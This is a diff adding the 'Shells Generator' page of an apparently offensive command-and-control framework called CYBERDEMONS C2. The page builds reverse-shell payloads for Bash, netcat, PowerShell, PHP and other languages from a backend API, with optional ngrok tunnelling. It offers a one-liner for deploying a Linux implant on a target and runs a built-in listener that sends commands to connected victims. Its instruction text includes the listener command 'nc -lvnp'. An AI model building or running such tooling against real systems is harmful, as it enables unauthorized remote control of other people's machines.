@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="theme-color" content="#0a0a0f">
+<title>Shells - CYBERDEMONS C2</title>
+<style>
+:root {
+  --cyan: #00fff0; --magenta: #ff00ff; --green: #39ff14;
+  --red: #ff0040; --yellow: #ffea00; --bg: #0a0a0f;
+  --surface: #0d0d1a; --card: #111122; --border: #1a1a3a;
+  --dim: #6a6a8a; --bright: #e0e0ff;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+body {
+  font-family: 'JetBrains Mono','Cascadia Code','Fira Code',monospace;
+  background: var(--bg); color: var(--bright);
+  min-height: 100vh; padding: 0 0 20px;
+  position: relative;
+}
+body::before {
+  content: ''; position: fixed; inset: 0;
+  background: linear-gradient(rgba(0,255,240,.03) 1px,transparent 1px),
+              linear-gradient(90deg,rgba(0,255,240,.03) 1px,transparent 1px);
+  background-size: 40px 40px; pointer-events: none; z-index: 0;
+}
+.hdr {
+  padding: 14px 16px; padding-top: max(14px,env(safe-area-inset-top,14px));
+  background: var(--surface); border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 10px;
+  position: sticky; top: 0; z-index: 10;
+}
+.hdr-logo { width:28px; height:28px; border-radius:50%; border:1px solid var(--cyan); flex-shrink:0; overflow:hidden; display:flex; align-items:center; justify-content:center; font-size:14px; color:var(--cyan); box-shadow:0 0 8px rgba(0,255,240,.2); }
+.hdr-logo img { width:100%; height:100%; object-fit:cover; border-radius:50%; }
+.hl { font-family: 'Orbitron',monospace; font-size: 16px; font-weight: 900; color: var(--cyan); letter-spacing: 2px; }
+.hl span { color: var(--magenta); }
+.hl small { font-size: 9px; color: var(--dim); font-family: 'JetBrains Mono',monospace; letter-spacing: 0; }
+.bk { margin-left: auto; text-decoration: none; font-size: 11px; padding: 6px 12px; border-radius: 6px; font-weight:700; background: linear-gradient(135deg,rgba(255,255,255,.06),rgba(255,255,255,.02)); color:var(--bright); box-shadow:0 2px 6px rgba(0,0,0,.3); transition:all .2s; border:none; }
+.bk:active { transform:scale(.93); opacity:.8; }
+.cnt { max-width: 500px; margin: 0 auto; padding: 12px 14px; position: relative; z-index: 1; }
+.cd {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 12px; padding: 16px; margin-bottom: 12px;
+  position: relative; overflow: hidden;
+}
+.cd::before { content: ''; position: absolute; top: -1px; left: 20%; right: 20%; height: 1px; background: linear-gradient(90deg,transparent,var(--cyan),transparent); opacity: .4; }
+.ct { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: var(--dim); margin-bottom: 12px; font-weight: 700; }
+.fg { margin-bottom: 10px; }
+.fg label { display: block; font-size: 9px; text-transform: uppercase; letter-spacing: 1px; color: var(--dim); margin-bottom: 4px; }
+.fg input, .fg select {
+  width: 100%; background: rgba(0,0,0,.4);
+  border: 1px solid var(--border); border-radius: 8px;
+  padding: 11px 14px; color: var(--bright);
+  font-family: inherit; font-size: 14px; outline: none;
+  transition: border-color .2s;
+}
+.fg input:focus, .fg select:focus { border-color: var(--cyan); }
+select { appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%236a6a8a'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 32px; }
+select optgroup { background: var(--surface); color: var(--dim); }
+select option { background: var(--surface); color: var(--bright); }
+.fr { display: flex; gap: 8px; }
+.fr .fg { flex: 1; }
+.fr .fg.small { flex: 0 0 100px; }
+.btn {
+  display: inline-flex; align-items: center; justify-content: center;
+  padding: 11px 18px; border-radius: 8px; border: none;
+  background: linear-gradient(135deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
+  color: var(--bright); font-family: inherit;
+  font-size: 11px; cursor: pointer; transition: all .2s;
+  text-decoration: none; gap: 4px; font-weight: 700;
+  box-shadow: 0 2px 8px rgba(0,0,0,.3);
+}
+.btn:active { transform: scale(.95); opacity: .8; }
+.btn-c { background: linear-gradient(135deg,#00fff0,#009b94); color: #000; box-shadow: 0 0 16px rgba(0,255,240,.35); }
+.btn-c:active { box-shadow: 0 0 24px rgba(0,255,240,.5); }
+.btn-g { background: linear-gradient(135deg,#39ff14,#1a8a00); color: #000; box-shadow: 0 0 16px rgba(57,255,20,.35); }
+.btn-g:active { box-shadow: 0 0 24px rgba(57,255,20,.5); }
+.btn-r { background: linear-gradient(135deg,#ff0040,#990026); color: #fff; box-shadow: 0 0 16px rgba(255,0,64,.35); }
+.btn-r:active { box-shadow: 0 0 24px rgba(255,0,64,.5); }
+.btn-fw { width: 100%; justify-content: center; }
+.btn-sm { padding: 7px 14px; font-size: 9px; border-radius: 6px; }
+.btn:disabled { opacity: .35; cursor: not-allowed; transform: none; box-shadow: none; }
+.box {
+  background: rgba(0,0,0,.5); border: 1px solid var(--border);
+  border-radius: 8px; padding: 12px; font-size: 11px;
+  color: var(--green); word-break: break-all; max-height: 200px;
+  overflow-y: auto; line-height: 1.5; margin: 8px 0;
+}
+.box::-webkit-scrollbar { width: 3px; }
+.box::-webkit-scrollbar-thumb { background: var(--cyan); border-radius: 2px; }
+.warn {
+  background: rgba(255,0,64,.08); border-left: 3px solid var(--red);
+  padding: 10px 12px; font-size: 10px; border-radius: 6px; color: var(--dim);
+  margin-top: 8px;
+}
+.warn strong { color: var(--cyan); }
+/* inline listener */
+.lc { margin-top: 12px; }
+.lh {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+  padding: 10px 14px; border-bottom: 1px solid var(--border); font-size: 10px;
+}
+.lh .st { display: flex; align-items: center; gap: 5px; margin-right: auto; }
+.lh .dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+.lh .dot.idle { background: var(--dim); }
+.lh .dot.listen { background: var(--yellow); animation: pl 1s infinite; }
+.lh .dot.conn { background: var(--green); box-shadow: 0 0 6px var(--green); }
+.lh .dot.err { background: var(--red); }
+.lh input { width: 70px; background: rgba(0,0,0,.4); border: 1px solid var(--border); border-radius: 6px; padding: 7px 10px; color: var(--bright); font-family: inherit; font-size: 12px; outline: none; }
+.lh input:focus { border-color: var(--cyan); }
+@keyframes pl { 0%,100% { opacity: 1; } 50% { opacity: .3; } }
+.lterm {
+  background: rgba(0,0,0,.6); height: 220px; overflow-y: auto;
+  padding: 10px 12px; font-size: 11px; line-height: 1.5;
+}
+.lterm::-webkit-scrollbar { width: 3px; }
+.lterm::-webkit-scrollbar-thumb { background: var(--magenta); border-radius: 2px; }
+.lterm .ln { white-space: pre-wrap; word-break: break-all; padding: 1px 0; }
+.lterm .ln.sys { color: var(--yellow); }
+.lterm .ln.out { color: var(--green); }
+.lterm .ln.err { color: var(--red); }
+.lterm .ln.inp { color: var(--cyan); }
+.lterm .ln.inp::before { content: '> '; color: var(--magenta); }
+.lir { display: flex; border-top: 1px solid var(--border); }
+.lir input { flex: 1; background: rgba(0,0,0,.4); border: none; padding: 10px 12px; color: var(--bright); font-family: inherit; font-size: 12px; outline: none; }
+.lir input:focus { background: rgba(0,0,0,.6); }
+.lir button { border: none; padding: 10px 18px; font-family: inherit; font-size: 10px; cursor: pointer; font-weight: 700; background: linear-gradient(135deg,#00fff0,#009b94); color:#000; box-shadow:0 0 10px rgba(0,255,240,.25); transition:all .2s; }
+.lir button:active { transform:scale(.93); box-shadow:0 0 18px rgba(0,255,240,.45); }
+.lir button:disabled { opacity: .35; cursor: not-allowed; transform: none; box-shadow: none; }
+body.has-bg::before { display: none; }
+/* oneliner */
+.ol {
+  border: 1px solid var(--green); border-radius: 10px;
+  background: rgba(57,255,20,.03); padding: 14px; margin-top: 12px;
+  position: relative;
+}
+.ol::before { content: 'C2 IMPLANT'; position: absolute; top: -9px; left: 14px; background: var(--bg); padding: 0 6px; font-family: 'Orbitron',monospace; font-size: 8px; color: var(--green); letter-spacing: 2px; }
+.ol .d { font-size: 10px; color: var(--dim); margin-bottom: 8px; line-height: 1.4; }
+.ol .o { background: rgba(0,0,0,.6); border: 1px solid var(--green); border-radius: 6px; padding: 10px; font-size: 10px; color: var(--green); word-break: break-all; margin-bottom: 8px; }
+.ol .s { font-size: 10px; color: var(--dim); line-height: 1.6; }
+.ol .s strong { color: var(--green); }
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="hdr-logo" id="hdrLogoEl">&#9760;</div>
+  <div class="hl"><span>SHELLS</span> <small>Generator</small></div>
+  <a href="/" class="bk">&#8592; C2</a>
+</div>
+
+<div class="cnt">
+  <div class="cd">
+    <div class="ct">&#128279; Listener Config</div>
+    <div class="fr">
+      <div class="fg">
+        <label>IP / Host</label>
+        <input type="text" id="lhost" value="127.0.0.1" placeholder="IP">
+      </div>
+      <div class="fg small">
+        <label>Port</label>
+        <input type="number" id="lport" value="4444" placeholder="4444">
+      </div>
+    </div>
+    <div class="fg">
+      <label>Language</label>
+      <select id="langSelect">
+        <optgroup label="CYBERDEMONS C2">
+          <option value="c2_python">C2 Protocol (Python)</option>
+        </optgroup>
+        <optgroup label="Linux / Unix">
+          <option value="bash_tcp">Bash /dev/tcp</option>
+          <option value="nc_traditional">Netcat (traditional -e)</option>
+          <option value="nc_mkfifo">Netcat (mkfifo, no -e)</option>
+          <option value="socat">Socat</option>
+          <option value="perl">Perl</option>
+          <option value="ruby">Ruby</option>
+          <option value="python3" selected>Python3</option>
+        </optgroup>
+        <optgroup label="Windows">
+          <option value="powershell_plain">PowerShell</option>
+          <option value="ncat_ssl">Ncat + SSL</option>
+          <option value="csharp">C#</option>
+        </optgroup>
+        <optgroup label="Other">
+          <option value="php_exec">PHP (exec)</option>
+          <option value="nodejs">Node.js</option>
+          <option value="java">Java</option>
+        </optgroup>
+      </select>
+    </div>
+    <div class="box" id="payloadDisplay">Select options</div>
+    <div style="display:flex;gap:6px;">
+      <button class="btn btn-r btn-sm" style="flex:1;" onclick="generate()">Generate</button>
+      <button class="btn btn-c btn-sm" style="flex:1;" id="copyBtn" onclick="copyPayload()">Copy</button>
+    </div>
+    <div class="warn">
+      <strong>C2 Protocol</strong> &rarr; set port to your C2 listener (e.g. 7777)<br>
+      <strong>Standard shells</strong> &rarr; use <code style="color:var(--green);">nc -lvnp &lt;PORT&gt;</code>
+    </div>
+  </div>
+
+  <div class="cd ol">
+    <div class="d">Deploy the <strong style="color:var(--green);">C2 Linux implant</strong> via one-liner.</div>
+    <div class="o" id="onelinerDisplay">Click refresh</div>
+    <div style="display:flex;gap:6px;">
+      <button class="btn btn-g btn-sm" style="flex:1;" onclick="refreshOL()">&#8635; Refresh</button>
+      <button class="btn btn-c btn-sm" style="flex:1;" onclick="copyOL()">Copy</button>
+    </div>
+    <div class="s" style="margin-top:8px;">
+      <strong>1.</strong> Build Linux payload in <a href="/builder" style="color:var(--cyan);">Builder</a><br>
+      <strong>2.</strong> Run one-liner on target<br>
+      <strong>3.</strong> Implant connects on port <span id="c2pDisplay" style="color:var(--cyan);">7777</span>
+    </div>
+  </div>
+
+  <!-- inline listener -->
+  <div class="cd lc">
+    <div class="ct">&#128264; Inline Listener</div>
+    <div class="lh">
+      <div class="st">
+        <span class="dot idle" id="listenerDot"></span>
+        <span id="listenerStatus">Stopped</span>
+      </div>
+      <input type="number" id="listenerPort" value="4444" placeholder="port">
+      <button class="btn btn-g btn-sm" id="listenerToggle" onclick="toggleListener()">Start</button>
+    </div>
+    <div class="lterm" id="listenerTerminal"><div class="ln sys">[idle]</div></div>
+    <div class="lir">
+      <input type="text" id="listenerInput" placeholder="type command..." disabled onkeydown="if(event.key==='Enter')sendLI()">
+      <button id="listenerSendBtn" disabled onclick="sendLI()">Send</button>
+    </div>
+  </div>
+</div>
+
+<script>
+async function api(url,opts){try{const r=await fetch(url,opts);return await r.json()}catch{return null}}
+
+const LHOST=document.getElementById('lhost'),LPORT=document.getElementById('lport'),LANG=document.getElementById('langSelect');
+const DISPLAY=document.getElementById('payloadDisplay'),COPY=document.getElementById('copyBtn'),ONELINER=document.getElementById('onelinerDisplay');
+
+async function generate(){
+  const ip=LHOST.value.trim()||'127.0.0.1',port=parseInt(LPORT.value)||4444,lang=LANG.value;
+  const d=await api(`/api/shells?ip=${ip}&port=${port}&lang=${lang}`);
+  if(d&&d.payload) DISPLAY.textContent=d.payload;
+}
+LHOST.addEventListener('input',generate);LPORT.addEventListener('input',generate);LANG.addEventListener('change',generate);
+(async()=>{
+  const ng=await api('/api/ngrok/status');
+  if(ng&&ng.running&&ng.host){LHOST.value=ng.host;LPORT.value=ng.port;}
+  generate();
+})();
+
+async function copyPayload(){
+  const t=DISPLAY.textContent;if(!t||t.includes('Select'))return;
+  try{await navigator.clipboard.writeText(t);COPY.textContent='Copied!';setTimeout(()=>COPY.textContent='Copy',1500)}catch{}
+}
+
+async function refreshOL(){
+  const d=await api('/api/shells/oneliner');
+  if(d){ONELINER.textContent=d.payload;document.getElementById('c2pDisplay').textContent=d.c2_port;}
+}
+refreshOL();
+
+async function copyOL(){try{await navigator.clipboard.writeText(ONELINER.textContent)}catch{}}
+
+// inline listener
+let lr=false,lp=null,loc=0;
+const LTERM=document.getElementById('listenerTerminal'),LDOT=document.getElementById('listenerDot');
+const LSTATUS=document.getElementById('listenerStatus'),LTOGGLE=document.getElementById('listenerToggle');
+const LPORT_IN=document.getElementById('listenerPort'),LINPUT=document.getElementById('listenerInput'),LSEND=document.getElementById('listenerSendBtn');
+
+function log(type,text){const d=document.createElement('div');d.className='ln '+type;d.textContent=text;LTERM.appendChild(d);LTERM.scrollTop=LTERM.scrollHeight;}
+
+async function toggleListener(){
+  if(lr){await stopL()}else{await startL()}
+}
+
+async function startL(){
+  const port=parseInt(LPORT_IN.value)||4444;
+  const r=await api('/api/shell-listener/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port})});
+  if(r&&r.error){log('err','[!] '+r.error);return}
+  lr=true;loc=0;LTERM.innerHTML='';
+  log('sys','[*] Listening on 0.0.0.0:'+port);
+  LTOGGLE.textContent='Stop';LTOGGLE.className='btn btn-r btn-sm';
+  LDOT.className='dot listen';LSTATUS.textContent='Listening';
+  LPORT_IN.disabled=true;log('sys','[*] Waiting...');
+  lp=setInterval(pollL,500);
+}
+
+async function stopL(){
+  const port=parseInt(LPORT_IN.value)||4444;
+  await api('/api/shell-listener/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port})});
+  lr=false;if(lp){clearInterval(lp);lp=null}
+  LTOGGLE.textContent='Start';LTOGGLE.className='btn btn-g btn-sm';
+  LDOT.className='dot idle';LSTATUS.textContent='Stopped';
+  LPORT_IN.disabled=false;LINPUT.disabled=true;LSEND.disabled=true;
+  log('sys','[*] Stopped');
+}
+
+async function pollL(){
+  const port=parseInt(LPORT_IN.value)||4444;
+  const d=await api(`/api/shell-listener/output?port=${port}&since=${loc}`);
+  if(!d)return;
+  for(const i of d.output){
+    if(i.type==='output') log('out',i.data);
+    else if(i.type==='system') log('sys',i.data);
+    else if(i.type==='error') log('err',i.data);
+  }
+  loc=d.count;
+  if(d.connected){LDOT.className='dot conn';LSTATUS.textContent='Connected';LINPUT.disabled=false;LSEND.disabled=false;LINPUT.focus();}
+  else if(lr){LDOT.className='dot listen';LSTATUS.textContent='Listening';LINPUT.disabled=true;LSEND.disabled=true;}
+}
+
+async function sendLI(){
+  const port=parseInt(LPORT_IN.value)||4444,text=LINPUT.value.trim();
+  if(!text)return;LINPUT.value='';log('inp',text);
+  await api('/api/shell-listener/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port,text})});
+}
+
+// bg + logo
+async function loadAssets(){
+  const d=await api('/api/settings');if(!d)return;
+  if(d.bg){document.body.style.backgroundImage=`url(${d.bg}?t=${Date.now()})`;document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.style.backgroundAttachment='fixed';document.body.classList.add('has-bg');}
+  if(d.logo){document.getElementById('hdrLogoEl').innerHTML=`<img src="${d.logo}?t=${Date.now()}" alt="logo">`;}
+}
+loadAssets();
+</script>
+</body>
+</html>
